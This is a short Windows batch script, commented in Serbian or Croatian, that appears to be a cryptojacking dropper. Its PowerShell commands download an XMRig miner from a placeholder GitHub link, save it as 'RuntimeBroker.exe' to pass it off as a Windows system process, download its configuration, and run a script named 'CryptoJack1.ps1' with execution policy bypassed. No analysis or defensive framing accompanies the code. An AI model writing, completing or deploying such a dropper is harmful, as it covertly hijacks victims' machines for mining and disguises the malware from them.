@echo off
:: Preuzimanje rudara i konfiguracije sa tvog GitHub-a
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_XMRIG', '%~dp0RuntimeBroker.exe')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_CONFIG', '%~dp0config.json')"

:: Pokretanje PowerShell skripte za instalaciju/izvrsavanje
powershell -ExecutionPolicy Bypass -File "%~dp0CryptoJack1.ps1"
